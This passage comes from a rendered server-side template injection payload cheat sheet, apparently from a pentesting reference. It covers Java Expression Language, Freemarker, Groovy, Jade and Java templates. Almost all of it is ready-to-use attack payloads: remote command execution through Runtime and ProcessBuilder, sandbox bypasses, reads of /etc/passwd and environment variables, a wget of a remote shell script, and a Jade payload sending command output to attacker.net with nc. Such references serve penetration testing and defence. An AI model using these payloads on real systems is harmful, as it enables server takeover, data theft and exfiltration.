+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.net.InetAddress&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getMethod</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;getByName&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">()).</span><span style="color:#a6e22e">invoke</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;xxxxxxxxxxxxxx.burpcollaborator.net&#34;</span><span style="color:#f92672">)}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// JVM System Property Lookup (ex: java.class.path)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.lang.System&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getDeclaredMethod</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;getProperty&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">()).</span><span style="color:#a6e22e">invoke</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;java.class.path&#34;</span><span style="color:#f92672">)}</span>
+</span></span></code></pre></div><h3 id="expression-language-el---code-execution">
+  Expression Language EL - Code Execution
+  <a class="anchor" href="#expression-language-el---code-execution">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// Common RCE payloads
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">&#39;&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Runtime</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getMethod</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span>getRuntime<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">,</span><span style="color:#66d9ef">null</span><span style="color:#f92672">).</span><span style="color:#a6e22e">invoke</span><span style="color:#f92672">(</span><span style="color:#66d9ef">null</span><span style="color:#f92672">,</span><span style="color:#66d9ef">null</span><span style="color:#f92672">).</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(&lt;</span>COMMAND STRING<span style="color:#f92672">/</span>ARRAY<span style="color:#f92672">&gt;)</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">ProcessBuilder</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getDeclaredConstructors</span><span style="color:#f92672">()[</span><span style="color:#ae81ff">1</span><span style="color:#f92672">].</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">(&lt;</span>COMMAND ARRAY<span style="color:#f92672">/</span>LIST<span style="color:#f92672">&gt;).</span><span style="color:#a6e22e">start</span><span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Method using Runtime
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#f92672">{</span>session<span style="color:#f92672">.</span><span style="color:#a6e22e">setAttribute</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;rtc&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.lang.Runtime&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getDeclaredConstructors</span><span style="color:#f92672">()[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">])}</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#f92672">{</span>session<span style="color:#f92672">.</span><span style="color:#a6e22e">getAttribute</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;rtc&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">)}</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#f92672">{</span>session<span style="color:#f92672">.</span><span style="color:#a6e22e">getAttribute</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;rtc&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/bash -c whoami&#34;</span><span style="color:#f92672">)}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Method using process builder
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$<span style="color:#f92672">{</span>request<span style="color:#f92672">.</span><span style="color:#a6e22e">setAttribute</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;c&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.util.ArrayList&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">())}</span>
+</span></span><span style="display:flex;"><span>$<span style="color:#f92672">{</span>request<span style="color:#f92672">.</span><span style="color:#a6e22e">getAttribute</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;c&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">add</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;cmd.exe&#34;</span><span style="color:#f92672">)}</span>
+</span></span><span style="display:flex;"><span>$<span style="color:#f92672">{</span>request<span style="color:#f92672">.</span><span style="color:#a6e22e">getAttribute</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;c&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">add</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/k&#34;</span><span style="color:#f92672">)}</span>
+</span></span><span style="display:flex;"><span>$<span style="color:#f92672">{</span>request<span style="color:#f92672">.</span><span style="color:#a6e22e">getAttribute</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;c&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">add</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;ping x.x.x.x&#34;</span><span style="color:#f92672">)}</span>
+</span></span><span style="display:flex;"><span>$<span style="color:#f92672">{</span>request<span style="color:#f92672">.</span><span style="color:#a6e22e">setAttribute</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.lang.ProcessBuilder&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getDeclaredConstructors</span><span style="color:#f92672">()[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">].</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">(</span>request<span style="color:#f92672">.</span><span style="color:#a6e22e">getAttribute</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;c&#34;</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">start</span><span style="color:#f92672">())}</span>
+</span></span><span style="display:flex;"><span>$<span style="color:#f92672">{</span>request<span style="color:#f92672">.</span><span style="color:#a6e22e">getAttribute</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">)}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Method using Reflection &amp; Invoke
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.lang.Runtime&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getMethods</span><span style="color:#f92672">()[</span><span style="color:#ae81ff">6</span><span style="color:#f92672">].</span><span style="color:#a6e22e">invoke</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.lang.Runtime&#34;</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;calc.exe&#34;</span><span style="color:#f92672">)}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Method using ScriptEngineManager one-liner
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$<span style="color:#f92672">{</span>request<span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;javax.script.ScriptEngineManager&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getEngineByName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;js&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">eval</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.lang.Runtime.getRuntime().exec(\\\&#34;ping x.x.x.x\\\&#34;)&#34;</span><span style="color:#f92672">))}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Method using ScriptEngineManager
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$<span style="color:#f92672">{</span>facesContext<span style="color:#f92672">.</span><span style="color:#a6e22e">getExternalContext</span><span style="color:#f92672">().</span><span style="color:#a6e22e">setResponseHeader</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;output&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;javax.script.ScriptEngineManager&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getEngineByName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;JavaScript&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">eval</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34;var x=new java.lang.ProcessBuilder;x.command(\\\&#34;wget\\\&#34;,\\\&#34;http://x.x.x.x/1.sh\\\&#34;);org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\&#34;</span><span style="color:#f92672">))}</span>
+</span></span></code></pre></div><hr>
+<h2 id="freemarker">
+  Freemarker
+  <a class="anchor" href="#freemarker">#</a>
+</h2>
+<p>
+  <a href="https://freemarker.apache.org/">Official website</a></p>
+<blockquote>
+<p>Apache FreeMarker™ is a template engine: a Java library to generate text output (HTML web pages, e-mails, configuration files, source code, etc.) based on templates and changing data.</p>
+</blockquote>
+<p>You can try your payloads at 
+  <a href="https://try.freemarker.apache.org">https://try.freemarker.apache.org</a></p>
+<h3 id="freemarker---basic-injection">
+  Freemarker - Basic injection
+  <a class="anchor" href="#freemarker---basic-injection">#</a>
+</h3>
+<p>The template can be <code>${3*3}</code> or the legacy <code>#{3*3}</code>.</p>
+<h3 id="freemarker---read-file">
+  Freemarker - Read File
+  <a class="anchor" href="#freemarker---read-file">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">$</span>{<span style="color:#a6e22e">product</span>.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getProtectionDomain</span>().<span style="color:#a6e22e">getCodeSource</span>().<span style="color:#a6e22e">getLocation</span>().<span style="color:#a6e22e">toURI</span>().<span style="color:#a6e22e">resolve</span>(<span style="color:#e6db74">&#39;path_to_the_file&#39;</span>).<span style="color:#a6e22e">toURL</span>().<span style="color:#a6e22e">openStream</span>().<span style="color:#a6e22e">readAllBytes</span>()<span style="color:#f92672">?</span><span style="color:#a6e22e">join</span>(<span style="color:#e6db74">&#34; &#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Convert</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">returned</span> <span style="color:#a6e22e">bytes</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">ASCII</span>
+</span></span></code></pre></div><h3 id="freemarker---code-execution">
+  Freemarker - Code execution
+  <a class="anchor" href="#freemarker---code-execution">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">assign</span> <span style="color:#a6e22e">ex</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;freemarker.template.utility.Execute&#34;</span><span style="color:#f92672">?</span><span style="color:#66d9ef">new</span>()<span style="color:#f92672">&gt;</span><span style="color:#a6e22e">$</span>{ <span style="color:#a6e22e">ex</span>(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span>[<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">assign</span> <span style="color:#a6e22e">ex</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;freemarker.template.utility.Execute&#39;</span><span style="color:#f92672">?</span><span style="color:#66d9ef">new</span>()]<span style="color:#a6e22e">$</span>{ <span style="color:#a6e22e">ex</span>(<span style="color:#e6db74">&#39;id&#39;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">$</span>{<span style="color:#e6db74">&#34;freemarker.template.utility.Execute&#34;</span><span style="color:#f92672">?</span><span style="color:#66d9ef">new</span>()(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span></code></pre></div><h3 id="freemarker---sandbox-bypass">
+  Freemarker - Sandbox bypass
+  <a class="anchor" href="#freemarker---sandbox-bypass">#</a>
+</h3>
+<p>:warning: only works on Freemarker versions below 2.3.30</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">assign</span> <span style="color:#a6e22e">classloader</span><span style="color:#f92672">=</span><span style="color:#a6e22e">article</span>.<span style="color:#66d9ef">class</span>.<span style="color:#a6e22e">protectionDomain</span>.<span style="color:#a6e22e">classLoader</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">assign</span> <span style="color:#a6e22e">owc</span><span style="color:#f92672">=</span><span style="color:#a6e22e">classloader</span>.<span style="color:#a6e22e">loadClass</span>(<span style="color:#e6db74">&#34;freemarker.template.ObjectWrapper&#34;</span>)<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">assign</span> <span style="color:#a6e22e">dwf</span><span style="color:#f92672">=</span><span style="color:#a6e22e">owc</span>.<span style="color:#a6e22e">getField</span>(<span style="color:#e6db74">&#34;DEFAULT_WRAPPER&#34;</span>).<span style="color:#a6e22e">get</span>(<span style="color:#66d9ef">null</span>)<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">assign</span> <span style="color:#a6e22e">ec</span><span style="color:#f92672">=</span><span style="color:#a6e22e">classloader</span>.<span style="color:#a6e22e">loadClass</span>(<span style="color:#e6db74">&#34;freemarker.template.utility.Execute&#34;</span>)<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">$</span>{<span style="color:#a6e22e">dwf</span>.<span style="color:#a6e22e">newInstance</span>(<span style="color:#a6e22e">ec</span>,<span style="color:#66d9ef">null</span>)(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span></code></pre></div><hr>
+<h2 id="groovy">
+  Groovy
+  <a class="anchor" href="#groovy">#</a>
+</h2>
+<p>
+  <a href="https://groovy-lang.org/">Official website</a></p>
+<h3 id="groovy---basic-injection">
+  Groovy - Basic injection
+  <a class="anchor" href="#groovy---basic-injection">#</a>
+</h3>
+<p>Refer to 
+  <a href="https://groovy-lang.org/syntax.html">https://groovy-lang.org/syntax.html</a> , but <code>${9*9}</code> is the basic injection.</p>
+<h3 id="groovy---read-and-create-file">
+  Groovy - Read and create File
+  <a class="anchor" href="#groovy---read-and-create-file">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-groovy" data-lang="groovy"><span style="display:flex;"><span>$<span style="color:#f92672">{</span>String x <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> File<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;c:/windows/notepad.exe&#39;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">text</span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>$<span style="color:#f92672">{</span>String x <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> File<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;/path/to/file&#39;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getText</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#39;UTF-8&#39;</span><span style="color:#f92672">)}</span>
+</span></span><span style="display:flex;"><span>$<span style="color:#f92672">{</span><span style="color:#66d9ef">new</span> File<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;C:\Temp\FileName.txt&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">createNewFile</span><span style="color:#f92672">();}</span>
+</span></span></code></pre></div><h3 id="groovy---http-request">
+  Groovy - HTTP request:
+  <a class="anchor" href="#groovy---http-request">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-groovy" data-lang="groovy"><span style="display:flex;"><span>$<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;http://www.google.com&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">toURL</span><span style="color:#f92672">().</span><span style="color:#a6e22e">text</span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>$<span style="color:#f92672">{</span><span style="color:#66d9ef">new</span> URL<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;http://www.google.com&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getText</span><span style="color:#f92672">()}</span>
+</span></span></code></pre></div><h3 id="groovy---command-execution">
+  Groovy - Command Execution
+  <a class="anchor" href="#groovy---command-execution">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-groovy" data-lang="groovy"><span style="display:flex;"><span>$<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;calc.exe&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">()}</span>
+</span></span><span style="display:flex;"><span>$<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;calc.exe&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">execute</span><span style="color:#f92672">()}</span>
+</span></span><span style="display:flex;"><span>$<span style="color:#f92672">{</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">evaluate</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;9*9&#34;</span><span style="color:#f92672">)</span> <span style="color:#75715e">//(this is a Script class)}
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$<span style="color:#f92672">{</span><span style="color:#66d9ef">new</span> org<span style="color:#f92672">.</span><span style="color:#a6e22e">codehaus</span><span style="color:#f92672">.</span><span style="color:#a6e22e">groovy</span><span style="color:#f92672">.</span><span style="color:#a6e22e">runtime</span><span style="color:#f92672">.</span><span style="color:#a6e22e">MethodClosure</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;calc.exe&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;execute&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">call</span><span style="color:#f92672">()}</span>
+</span></span></code></pre></div><h3 id="groovy---sandbox-bypass">
+  Groovy - Sandbox Bypass
+  <a class="anchor" href="#groovy---sandbox-bypass">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-groovy" data-lang="groovy"><span style="display:flex;"><span>$<span style="color:#f92672">{</span> <span style="color:#a6e22e">@ASTTest</span><span style="color:#f92672">(</span>value<span style="color:#f92672">={</span><span style="color:#66d9ef">assert</span> java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Runtime</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;whoami&#34;</span><span style="color:#f92672">)})</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> x <span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>or</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-groovy" data-lang="groovy"><span style="display:flex;"><span>$<span style="color:#f92672">{</span> <span style="color:#66d9ef">new</span> groovy<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">GroovyClassLoader</span><span style="color:#f92672">().</span><span style="color:#a6e22e">parseClass</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\&#34;calc.exe\&#34;)})def x&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">}</span>
+</span></span></code></pre></div><hr>
+<h2 id="handlebars">
+  Handlebars
+  <a class="anchor" href="#handlebars">#</a>
+</h2>
+<p>
+  <a href="https://handlebarsjs.com/">Official website</a></p>
+<blockquote>
+<p>Handlebars compiles templates into JavaScript functions.</p>
+</blockquote>
+<h3 id="need-bugfix-for-handlebars">
+  NEED BUGFIX FOR HANDLEBARS
+  <a class="anchor" href="#need-bugfix-for-handlebars">#</a>
+</h3>
+<hr>
+<h2 id="jade--codepen">
+  Jade / Codepen
+  <a class="anchor" href="#jade--codepen">#</a>
+</h2>
+<p>
+  <a href="https://codepen.io/">Official website</a></p>
+<blockquote>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">-</span> var x <span style="color:#f92672">=</span> root<span style="color:#f92672">.</span>process
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span> x <span style="color:#f92672">=</span> x<span style="color:#f92672">.</span>mainModule<span style="color:#f92672">.</span>require
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span> x <span style="color:#f92672">=</span> x(<span style="color:#e6db74">&#39;child_process&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=</span> x<span style="color:#f92672">.</span>exec(<span style="color:#e6db74">&#39;id | nc attacker.net 80&#39;</span>)
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span>{<span style="color:#a6e22e">root</span>.<span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">mainModule</span>.<span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>).<span style="color:#a6e22e">spawnSync</span>(<span style="color:#e6db74">&#39;cat&#39;</span>, [<span style="color:#e6db74">&#39;/etc/passwd&#39;</span>]).<span style="color:#a6e22e">stdout</span>}
+</span></span></code></pre></div><hr>
+<h2 id="java">
+  Java
+  <a class="anchor" href="#java">#</a>
+</h2>
+<h3 id="java---basic-injection">
+  Java - Basic injection
+  <a class="anchor" href="#java---basic-injection">#</a>
+</h3>
+<blockquote>
+<p>Multiple variable expressions can be used, if <code>${...}</code> doesn&rsquo;t work try <code>#{...}</code>, <code>*{...}</code>, <code>@{...}</code> or <code>~{...}</code>.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>$<span style="color:#f92672">{</span><span style="color:#ae81ff">7</span><span style="color:#f92672">*</span><span style="color:#ae81ff">7</span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>$<span style="color:#f92672">{</span>class<span style="color:#f92672">.</span><span style="color:#a6e22e">getClassLoader</span><span style="color:#f92672">()}</span>
+</span></span><span style="display:flex;"><span>$<span style="color:#f92672">{</span>class<span style="color:#f92672">.</span><span style="color:#a6e22e">getResource</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getPath</span><span style="color:#f92672">()}</span>
+</span></span><span style="display:flex;"><span>$<span style="color:#f92672">{</span>class<span style="color:#f92672">.</span><span style="color:#a6e22e">getResource</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;../../../../../index.htm&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getContent</span><span style="color:#f92672">()}</span>
+</span></span></code></pre></div><h3 id="need-bugfix-for-some-java">
+  NEED BUGFIX FOR SOME JAVA
+  <a class="anchor" href="#need-bugfix-for-some-java">#</a>
+</h3>
+<h3 id="java---retrieve-the-systems-environment-variables">
+  Java - Retrieve the system’s environment variables
+  <a class="anchor" href="#java---retrieve-the-systems-environment-variables">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>$<span style="color:#f92672">{</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">System</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getenv</span><span style="color:#f92672">()}</span>
+</span></span></code></pre></div><h3 id="java---retrieve-etcpasswd">
+  Java - Retrieve /etc/passwd
+  <a class="anchor" href="#java---retrieve-etcpasswd">#</a>
+</h3>
